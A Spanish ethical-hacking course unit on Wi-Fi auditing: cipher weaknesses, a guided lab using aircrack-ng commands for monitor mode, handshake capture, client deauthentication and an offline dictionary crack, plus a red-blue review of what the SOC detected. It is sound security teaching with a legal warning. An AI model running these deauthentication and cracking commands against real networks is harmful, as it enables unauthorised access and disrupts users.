# HE · UT3 — Auditoría de redes inalámbricas Wi-Fi

**10 horas** · RA2 (a, b, c, d) · Servicio SOC: Protección — emulación de adversarios · Evidencias `HE-E5`, `HE-E6`

---

## 1. Objetivo de la unidad

Auditar la seguridad de una red Wi-Fi de laboratorio: configurar la tarjeta en modo monitor, entender los cifrados y sus debilidades, capturar el saludo y demostrar el acceso a una red con clave débil. Y, desde el lado defensivo, comprobar qué de todo eso **detecta el SOC**.

## 2. Contenido

### 2.1 Modos de la tarjeta inalámbrica (RA2.a)

- **Infraestructura**: cliente asociado a un punto de acceso.
- **Ad-hoc**: entre iguales.
- **Monitor**: captura todo el tráfico del canal sin asociarse. Requiere adaptador compatible.

### 2.2 Cifrados y debilidades (RA2.b)

| Cifrado | Estado | Debilidad |
|---|---|---|
| **WEP** | Roto | RC4 + IV corto; se rompe en minutos |
| **WPA/WPA2-Personal** | Vulnerable con clave débil | Captura del saludo de 4 vías + ataque de diccionario offline |
| **WPA2-Enterprise (802.1X)** | Fuerte | Depende de la validación del certificado del cliente |
| **WPA3 (SAE)** | Actual | Resistente a diccionario offline; ojo a la transición WPA2/WPA3 |

### 2.3 Descubrimiento y captura (RA2.c)

- Balizas (beacons), saludo de 4 vías (handshake), PMKID.
- Selección de canal y potencia.

### 2.4 Defensa (RA2.d, RA2.f)

- 802.1X con certificados, segmentación de red de invitados, detección de puntos de acceso no autorizados (rogue AP), monitorización desde el SOC.

## 3. Laboratorio guiado

> Entorno: **red de laboratorio físicamente aislada**, punto de acceso propio del centro. Adaptador con modo monitor. Alternativa virtualizada con capturas grabadas para quien no disponga de hardware.

### Parte A — Modo monitor y captura (RA2.a, RA2.c)

```bash
# Poner la interfaz en modo monitor
sudo airmon-ng start wlan0
# Descubrir redes y clientes del laboratorio
sudo airodump-ng wlan0mon
# Capturar el saludo de una red concreta del laboratorio
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w captura wlan0mon
```

### Parte B — Acceso a red con clave débil (RA2.d)

```bash
# Forzar la reautenticación de un cliente para capturar el handshake (solo en laboratorio propio)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Ataque de diccionario OFFLINE contra el handshake capturado
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

1. Recupera la clave débil de la red **propia de laboratorio** y **mide el tiempo** empleado. Reflexiona sobre qué longitud/complejidad la habría hecho inviable.

### Parte C — Contraste con el SOC (RA2.d, componente defensivo)

2. Desde el lado azul, comprueba qué generó el SOC: ¿detectó la trama de desautenticación? ¿el punto de acceso no autorizado? Documenta qué se vio y qué no.

## 4. Entregables

- **`HE-E5`** (laboratorio, rúbrica R1): práctica de captura y análisis de tráfico inalámbrico con evidencia del acceso obtenido y el tiempo empleado.
- **`HE-E6`** (reto integrado, rúbrica R3): contraste rojo-azul — qué detectó el SOC del ataque inalámbrico y qué no, con la regla de detección que faltaría.

## 5. Criterios de superación

- El acceso se demuestra sobre red propia de laboratorio, con captura reproducible.
- El contraste con el SOC identifica los puntos ciegos de detección.

## 6. Advertencia

Capturar tráfico o desautenticar clientes en redes ajenas es delito (arts. 197 bis/ter). Solo sobre la red aislada del laboratorio y con el ROE firmado.

## 7. Referencias

- Suite **aircrack-ng** · hcxdumptool · bettercap.
- Wi-Fi Alliance — WPA3.
- MITRE ATT&CK — técnicas de acceso inicial por red inalámbrica.
